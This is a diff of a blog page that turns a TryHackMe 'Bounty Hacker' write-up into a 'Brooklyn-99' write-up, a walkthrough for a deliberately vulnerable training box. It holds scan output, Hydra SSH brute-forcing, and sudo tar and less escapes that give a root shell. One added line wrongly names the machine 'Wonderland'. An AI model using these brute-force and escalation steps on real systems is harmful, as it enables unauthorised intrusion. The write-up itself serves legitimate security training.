@@ -5,17 +5,17 @@
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="map[name:Siva Rajendran]">
-<meta name="description" content="The following write up is for the machine: Bounty-Hacker
+<meta name="description" content="The following write up is for the machine: Wonderland
 Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="#252627" />
-<link rel="canonical" href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-bounty-hacker-writeup/" />
+<link rel="canonical" href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-brooklyn-99-writeup/" />
 
 
     <title>
         
-            Tryhackme- Bounty Hacker Writeup :: 0xSh1v4 Infosec Blog  — Writeups, CTFs
+            Tryhackme- Brooklyn-99 Writeup :: 0xSh1v4 Infosec Blog  — Writeups, CTFs
         
     </title>
 
@@ -42,12 +42,12 @@ Tryhackme is an online CTF platform where you can hone your penetration testing 
 
 
 
-<meta itemprop="name" content="Tryhackme- Bounty Hacker Writeup">
-<meta itemprop="description" content="The following write up is for the machine: Bounty-Hacker
+<meta itemprop="name" content="Tryhackme- Brooklyn-99 Writeup">
+<meta itemprop="description" content="The following write up is for the machine: Wonderland
 Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.">
 <meta itemprop="datePublished" content="2020-09-16T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2020-09-16T00:00:00+00:00" />
-<meta itemprop="wordCount" content="1076">
+<meta itemprop="wordCount" content="1179">
 <meta itemprop="image" content="https://0xSh1v4.github.io"/>
 
 
@@ -57,17 +57,17 @@ Tryhackme is an online CTF platform where you can hone your penetration testing 
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://0xSh1v4.github.io"/>
 
-<meta name="twitter:title" content="Tryhackme- Bounty Hacker Writeup"/>
-<meta name="twitter:description" content="The following write up is for the machine: Bounty-Hacker
+<meta name="twitter:title" content="Tryhackme- Brooklyn-99 Writeup"/>
+<meta name="twitter:description" content="The following write up is for the machine: Wonderland
 Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas."/>
 
 
 
-    <meta property="og:title" content="Tryhackme- Bounty Hacker Writeup" />
-<meta property="og:description" content="The following write up is for the machine: Bounty-Hacker
+    <meta property="og:title" content="Tryhackme- Brooklyn-99 Writeup" />
+<meta property="og:description" content="The following write up is for the machine: Wonderland
 Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://0xSh1v4.github.io/posts/2020/09/tryhackme-bounty-hacker-writeup/" />
+<meta property="og:url" content="https://0xSh1v4.github.io/posts/2020/09/tryhackme-brooklyn-99-writeup/" />
 <meta property="og:image" content="https://0xSh1v4.github.io"/>
 <meta property="article:published_time" content="2020-09-16T00:00:00+00:00" />
 <meta property="article:modified_time" content="2020-09-16T00:00:00+00:00" />
@@ -152,33 +152,32 @@ Tryhackme is an online CTF platform where you can hone your penetration testing 
 
     <article>
       <h1 class="post-title">
-        <a href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-bounty-hacker-writeup/">Tryhackme- Bounty Hacker Writeup</a>
+        <a href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-brooklyn-99-writeup/">Tryhackme- Brooklyn-99 Writeup</a>
       </h1>
 
       
 
       <div class="post-content">
-        <p>The following write up is for the machine: Bounty-Hacker</p>
+        <p>The following write up is for the machine: Wonderland</p>
 <p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
 <h2 id="synopsis">Synopsis</h2>
-<p><a href="https://www.tryhackme.com/room/cowboyhacker">Bounty-Hacker</a> is the very easy boot2root machine where we need to find two flags in the machine. Basic enumeration and simple exploitation technique gives you access to the server and later easy escaltion to root could be done with one line command.</p>
+<p><a href="https://www.tryhackme.com/room/brooklynninenine">Brooklyn99</a> is the very easy boot2root machine where we need to find two flags in the machine. Basic enumeration and simple exploitation technique of weak password gives you access to the server and later easy escaltion to root could be done by multiple methods.</p>
 <h2 id="scanning-and-enumeration-the-network">Scanning and Enumeration the network</h2>
 <p>As usual, let us run the nmap tool to can the target network.</p>
 <h3 id="nmap-results">Nmap Results:</h3>
 <p>As usual I tried to run the scan with the following command.</p>
 <pre><code>nmap -sC -sV -oA top 10.10.173.51
 </code></pre><p>We have got the following results.</p>
-<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Bounty-Hacker]
-└─$ sudo nmap -sC -sV -oA top 10.10.173.51           
-[sudo] password for zeus: 
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-16 23:22 CEST
-Nmap scan report for 10.10.173.51
-Host is up (0.044s latency).
-Not shown: 967 filtered ports, 30 closed ports
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/brokyln-99]
+└─$ sudo nmap -sC -sV -oA top 10.10.9.59
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-18 23:58 CEST
+Nmap scan report for 10.10.9.59
+Host is up (0.077s latency).
+Not shown: 997 closed ports
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_Can't get directory listing: TIMEOUT
+|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
@@ -189,167 +188,170 @@ PORT   STATE SERVICE VERSION
 |      Session timeout in seconds is 300
 |      Control connection is plain text
 |      Data connections will be plain text
-|      At session startup, client count was 3
+|      At session startup, client count was 4
 |      vsFTPd 3.0.3 - secure, fast, stable
 |_End of status
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
-|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
-|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
+|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
+|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
+|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Site doesn't have a title (text/html).
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 45.42 seconds
-</code></pre><p>From the results, we found that anonymous ftp login is allowed. so lets login and see what details they have.</p>
-<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Bounty-Hacker]
-└─$ ftp 10.10.173.51
-Connected to 10.10.173.51.
+Nmap done: 1 IP address (1 host up) scanned in 14.01 seconds
+</code></pre><p>From the results, we found the anonymous ftp login is allowed and there is a file present in the system.</p>
+<h3 id="ftp-info">FTP Info</h3>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/brokyln-99]
+└─$ ftp 10.10.9.59     
+Connected to 10.10.9.59.
 220 (vsFTPd 3.0.3)
-Name (10.10.173.51:zeus): anonymous
+Name (10.10.9.59:zeus): anonymous
+331 Please specify the password.
+Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp&gt; ls
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
--rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
--rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
+-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
 226 Directory send OK.
-</code></pre><p>There are two files, lets download these files into our local to examine the contents.</p>
-<h3 id="dirb-results">Dirb Results</h3>
-<p>Dirb shows the below results. nothing seems useful in our case.</p>
-<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Bounty-Hacker]
-└─$ dirb http://10.10.173.51                                                                       
+ftp&gt; get note_to_jake.txt
+local: note_to_jake.txt remote: note_to_jake.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
+226 Transfer complete.
+119 bytes received in 0.00 secs (49.6416 kB/s)
+ftp&gt; exit
+221 Goodbye.
+</code></pre><p>From the text file, we found the following info.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/brokyln-99]
+└─$ cat note_to_jake.txt 
+From Amy,
+
+Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+</code></pre><p>Port 80 displays the following page:</p>
+<figure>
+    <img src="https://0xSh1v4.github.io/Tryhackme/Brook/1.png"
+         alt="Tryhackme: Brooklyn-99 machine - Port-80 Page"/> <figcaption>
+            <p>Tryhackme: Brooklyn-99 machine - Port-80 Page</p>
+        </figcaption>
+</figure>
+
+<h3 id="dirb-results">Dirb Results:</h3>
+<p>Din&rsquo;t get much from dirb</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/brokyln-99]
+└─$ dirb http://10.10.9.59 
 
 -----------------
 DIRB v2.22    
 By The Dark Raver
 -----------------
 
-START_TIME: Wed Sep 16 23:22:41 2020
-URL_BASE: http://10.10.173.51/
+START_TIME: Fri Sep 18 23:59:03 2020
+URL_BASE: http://10.10.9.59/
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 
 GENERATED WORDS: 4612                                                          
 
----- Scanning URL: http://10.10.173.51/ ----
-==&gt; DIRECTORY: http://10.10.173.51/images/                                                                                                                                                                                                   
-+ http://10.10.173.51/index.html (CODE:200|SIZE:969)                                                                                                                                                                                         
-+ http://10.10.173.51/server-status (CODE:403|SIZE:277)                                                                                                                                                                                      
+---- Scanning URL: http://10.10.9.59/ ----
++ http://10.10.9.59/index.html (CODE:200|SIZE:718)                                                                                                                                                                                           
++ http://10.10.9.59/server-status (CODE:403|SIZE:275)                                                                                                                                                                                        
                                                                                                                                                                                                                                              
----- Entering directory: http://10.10.173.51/images/ ----
-(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
-    (Use mode '-w' if you want to scan it anyway)
-                                                                               
 -----------------
-END_TIME: Wed Sep 16 23:26:28 2020
+END_TIME: Sat Sep 19 00:03:36 2020
 DOWNLOADED: 4612 - FOUND: 2
-</code></pre><p>Looking into the downloaded files which we got, we got some password list and some text.</p>
-<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Bounty-Hacker]
-└─$ cat task.txt    
-1.) Protect Vicious.
-2.) Plan for Red Eye pickup on the moon.
-
--lin
-                                                                                                                      
-┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Bounty-Hacker]
-└─$ cat locks.txt 
-rEddrAGON
-ReDdr4g0nSynd!cat3
-Dr@gOn$yn9icat3
-R3DDr46ONSYndIC@Te
-ReddRA60N
-R3dDrag0nSynd1c4te
-dRa6oN5YNDiCATE
-ReDDR4g0n5ynDIc4te
-R3Dr4gOn2044
-RedDr4gonSynd1cat3
-R3dDRaG0Nsynd1c@T3
-Synd1c4teDr@g0n
-reddRAg0N
-REddRaG0N5yNdIc47e
-Dra6oN$yndIC@t3
-4L1mi6H71StHeB357
-rEDdragOn$ynd1c473
-DrAgoN5ynD1cATE
-ReDdrag0n$ynd1cate
-Dr@gOn$yND1C4Te
-RedDr@gonSyn9ic47e
-REd$yNdIc47e
-dr@goN5YNd1c@73
-rEDdrAGOnSyNDiCat3
-r3ddr@g0N
-ReDSynd1ca7e
-</code></pre><p>We don&rsquo;t have any HTTP login page or any other service to bruteforce except SSH. So, lets try to brute using this wordlist in SSH with the username lin.</p>
-<h2 id="exploitation">Exploitation</h2>
-<p>With a second, I got the password for the user lin.</p>
-<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Bounty-Hacker]
-└─$ hydra -l lin -P locks.txt 10.10.173.51 ssh
+</code></pre><h2 id="exploiting-the-machine">Exploiting the machine</h2>
+<p>Lets try to brute the user <strong>jake</strong> with the password list (rockyou.txt)using hydra for ssh service.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/brokyln-99]
+└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.9.59 ssh   
 Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-16 23:31:52
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-19 00:04:04
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
-[DATA] attacking ssh://10.10.173.51:22/
-[22][ssh] host: 10.10.173.51   login: lin   password: [REDACTED]
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://10.10.9.59:22/
+[22][ssh] host: 10.10.9.59   login: jake   password: 987654321
 1 of 1 target successfully completed, 1 valid password found
 [WARNING] Writing restore file because 1 final worker threads did not complete until end.
 [ERROR] 1 target did not resolve or could not be connected
 [ERROR] 0 target did not complete
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-16 23:31:55
-</code></pre><p>Now, lets ssh into the machine</p>
-<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Bounty-Hacker]
-└─$ ssh lin@10.10.173.51                                                                                        255 ⨯
-The authenticity of host '10.10.173.51 (10.10.173.51)' can't be established.
-ECDSA key fingerprint is SHA256:fzjl1gnXyEZI9px29GF/tJr+u8o9i88XXfjggSbAgbE.
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-19 00:04:48
+</code></pre><p>Now we got the password. lets login to the machine.</p>
+<p>now lets ssh into the machine.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/brokyln-99]
+└─$ ssh jake@10.10.9.59                                                                                                                                                                                                                 255 ⨯
+The authenticity of host '10.10.9.59 (10.10.9.59)' can't be established.
+ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.173.51' (ECDSA) to the list of known hosts.
-lin@10.10.173.51's password: 
-Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-83 packages can be updated.
-0 updates are security updates.
-
-Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
-lin@bountyhacker:~/Desktop$ whoami
-lin
-</code></pre><p>Now we are into the machine, running a basic sudo -l gave us the next step to escalate the privilege to root user and also, we have got the user.txt file</p>
-<pre><code>lin@bountyhacker:~/Desktop$ sudo -l
-[sudo] password for lin:  
-Matching Defaults entries for lin on bountyhacker:
+Warning: Permanently added '10.10.9.59' (ECDSA) to the list of known hosts.
+jake@10.10.9.59's password: 
+Last login: Tue May 26 08:56:58 2020
+jake@brookly_nine_nine:~$ ls
+</code></pre><p>Now, we got the user flag.</p>
+<pre><code>jake@brookly_nine_nine:~$ pwd
+/home/jake
+jake@brookly_nine_nine:~$ cd ..
+jake@brookly_nine_nine:/home$ ls -la
+total 20
+drwxr-xr-x  5 root root 4096 May 18 10:21 .
+drwxr-xr-x 24 root root 4096 May 19 15:17 ..
+drwxr-xr-x  5 amy  amy  4096 May 18 10:23 amy
+drwxr-xr-x  6 holt holt 4096 May 26 09:01 holt
+drwxr-xr-x  6 jake jake 4096 May 26 09:01 jake
+jake@brookly_nine_nine:/home$ cd holt/
+jake@brookly_nine_nine:/home/holt$ ls
+nano.save  user.txt
+jake@brookly_nine_nine:/home/holt$ ls -la
+total 48
+drwxr-xr-x 6 holt holt 4096 May 26 09:01 .
+drwxr-xr-x 5 root root 4096 May 18 10:21 ..
+-rw------- 1 holt holt   18 May 26 09:01 .bash_history
+-rw-r--r-- 1 holt holt  220 May 17 21:42 .bash_logout
+-rw-r--r-- 1 holt holt 3771 May 17 21:42 .bashrc
+drwx------ 2 holt holt 4096 May 18 10:24 .cache
+drwx------ 3 holt holt 4096 May 18 10:24 .gnupg
+drwxrwxr-x 3 holt holt 4096 May 17 21:46 .local
+-rw-r--r-- 1 holt holt  807 May 17 21:42 .profile
+drwx------ 2 holt holt 4096 May 18 14:45 .ssh
+-rw------- 1 root root  110 May 18 17:12 nano.save
+-rw-rw-r-- 1 holt holt   33 May 17 21:49 user.txt
+jake@brookly_nine_nine:/home/holt$ cat user.txt 
+ee1[REDACTED]ee
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Lets check what permissions does the user have:</p>
+<pre><code>jake@brookly_nine_nine:/home/holt$ sudo -l
+Matching Defaults entries for jake on brookly_nine_nine:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User lin may run the following commands on bountyhacker:
-    (root) /bin/tar
-lin@bountyhacker:~/Desktop$ ls
-user.txt
-lin@bountyhacker:~/Desktop$ cat user.txt 
-THM{REDACTED}
-
-</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
-<p>Now, lets go to gtfobins to find the sudo tar command to escalate to root.
-I ran the following command and escalated to root.
-<code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></p>
-<pre><code>lin@bountyhacker:~/Desktop$  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-tar: Removing leading `/' from member names
+User jake may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /usr/bin/less
+</code></pre><p>So, the user jake can run less with sudo permissions. So, lets go to <a href="https://gtfobins.github.io/gtfobins/less/#sudo">LESS-gtfobins</a></p>
+<pre><code>jake@brookly_nine_nine:/home/holt$ sudo less /etc/profile
+# id
+uid=0(root) gid=0(root) groups=0(root)
 # whoami
 root
-# ls
-user.txt
+# ls      
+nano.save  user.txt
 # cd /root
-# cat root.txt	
-THM{REDACTED}
-</code></pre><p>Overall, very easy machine I would say. It was good to do something very fast and I have improved myself alot after doing some 25 boxes in Tryhackme so far.</p>
+# ls
+root.txt
+# cat root.txt
+-- Creator : Fsociety2006 --
+Congratulations in rooting Brooklyn Nine Nine
+Here is the flag: 63a[REDACTED]845
+
+Enjoy!!
+</code></pre><p>There is also another way to escalate to root, which is using <a href="https://gtfobins.github.io/gtfobins/nano/">gtfobins-NANO</a>. we saw that the file <strong>nano.save</strong> has read/write permissions.</p>
+<p>We could use that to escalate to root. Read more here.</p>
+<p>And thats how we got the root flag. Simple machine and took few minutes to root his box.</p>
 <p>Thanks for reading! Prost! 🍺</p>
 <p>If you have any questions: Feel free to contact me.</p>
 <p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
@@ -381,7 +383,7 @@ THM{REDACTED}
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        1076 Words
+        1179 Words
       </p>
 
       <p>
@@ -397,7 +399,7 @@ THM{REDACTED}
       <hr />
       <div class="sharing-buttons">
         
-<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-bounty-hacker-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-brooklyn-99-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
   <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
     </div>
@@ -405,7 +407,7 @@ THM{REDACTED}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-bounty-hacker-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-brooklyn-99-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
   <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
       <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
@@ -414,7 +416,7 @@ THM{REDACTED}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Tryhackme-%20Bounty%20Hacker%20Writeup&amp;caption=Tryhackme-%20Bounty%20Hacker%20Writeup&amp;canonicalUrl=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-bounty-hacker-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Tryhackme-%20Brooklyn-99%20Writeup&amp;caption=Tryhackme-%20Brooklyn-99%20Writeup&amp;canonicalUrl=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-brooklyn-99-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
   <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
     <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
@@ -423,7 +425,7 @@ THM{REDACTED}
 </a>
 
 
-<a class="resp-sharing-button__link" href="mailto:?subject=Tryhackme-%20Bounty%20Hacker%20Writeup&amp;body=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-bounty-hacker-writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+<a class="resp-sharing-button__link" href="mailto:?subject=Tryhackme-%20Brooklyn-99%20Writeup&amp;body=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-brooklyn-99-writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
   <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
     </div>
@@ -431,7 +433,7 @@ THM{REDACTED}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-bounty-hacker-writeup%2f&amp;media=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-bounty-hacker-writeup%2f;description=Tryhackme-%20Bounty%20Hacker%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-brooklyn-99-writeup%2f&amp;media=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-brooklyn-99-writeup%2f;description=Tryhackme-%20Brooklyn-99%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
   <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
     </div>
@@ -439,7 +441,7 @@ THM{REDACTED}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-bounty-hacker-writeup%2f&amp;title=Tryhackme-%20Bounty%20Hacker%20Writeup&amp;summary=Tryhackme-%20Bounty%20Hacker%20Writeup&amp;source=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-bounty-hacker-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
